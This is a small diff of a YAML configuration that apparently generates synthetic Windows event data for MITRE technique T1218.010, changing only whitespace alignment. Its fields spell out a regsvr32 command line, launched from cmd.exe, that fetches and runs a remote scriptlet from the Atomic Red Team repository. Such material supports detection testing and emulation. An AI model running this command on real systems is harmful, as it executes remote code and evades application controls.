@@ -17,7 +17,7 @@ mitre:
   techniques: [T1218.010]
 
 state:
-  domain_short:        CORP
+  domain_short:         CORP
   domain_tld:           local
   domain_short_lower:   fn.lower(ref.domain_short)
   domain_fqdn:          "${ref.domain_short_lower}.${ref.domain_tld}"
@@ -38,10 +38,10 @@ state:
   user:                 "${ref.domain_short}\\${ref.username}"
   current_directory:    "C:\\Users\\${ref.username}\\AppData\\Local\\Temp\\"
   event_record_id:      gen.int(min=5000, max=9999999)
-  regsvr32_args:         "/s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll"
-  command_line:          "C:\\Windows\\system32\\regsvr32.exe  ${ref.regsvr32_args} "
-  parent_image:          "C:\\Windows\\System32\\cmd.exe"
-  parent_command_line:   "\"C:\\Windows\\system32\\cmd.exe\" /c \"C:\\Windows\\system32\\regsvr32.exe ${ref.regsvr32_args}\" "
+  regsvr32_args:        "/s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll"
+  command_line:         "C:\\Windows\\system32\\regsvr32.exe  ${ref.regsvr32_args} "
+  parent_image:         "C:\\Windows\\System32\\cmd.exe"
+  parent_command_line:  "\"C:\\Windows\\system32\\cmd.exe\" /c \"C:\\Windows\\system32\\regsvr32.exe ${ref.regsvr32_args}\" "
 
 steps:
   - emit:
